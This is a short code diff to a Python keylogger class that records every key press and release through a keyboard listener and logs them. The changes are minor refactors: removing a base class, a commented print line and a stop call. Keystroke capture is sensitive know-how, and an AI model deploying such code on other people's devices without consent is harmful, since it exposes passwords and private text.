@@ -11,7 +11,7 @@ from Functions.JSONLib import JSONLib
 logger = Logger("Keyboard")
 json = JSONLib()
 
-class KeyLogger(Logger):
+class KeyLogger():
 
     def __init__(self):
         self.keys = []
@@ -76,7 +76,6 @@ class KeyLogger(Logger):
         logger.debug(message=f"{key} pressed")
         logger.info(message=f"{key}", key_press=key, text=False)
         self.__add_pressed_key_in_list_of_texts(str(key))
-        # print(self.get_keys())
         
     def on_release(self, key) -> None:
         logger.debug(message=f"{key} released")
@@ -84,5 +83,4 @@ class KeyLogger(Logger):
     def keyboard_listener(self) -> None:    
         with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
-        listener.stop()
             
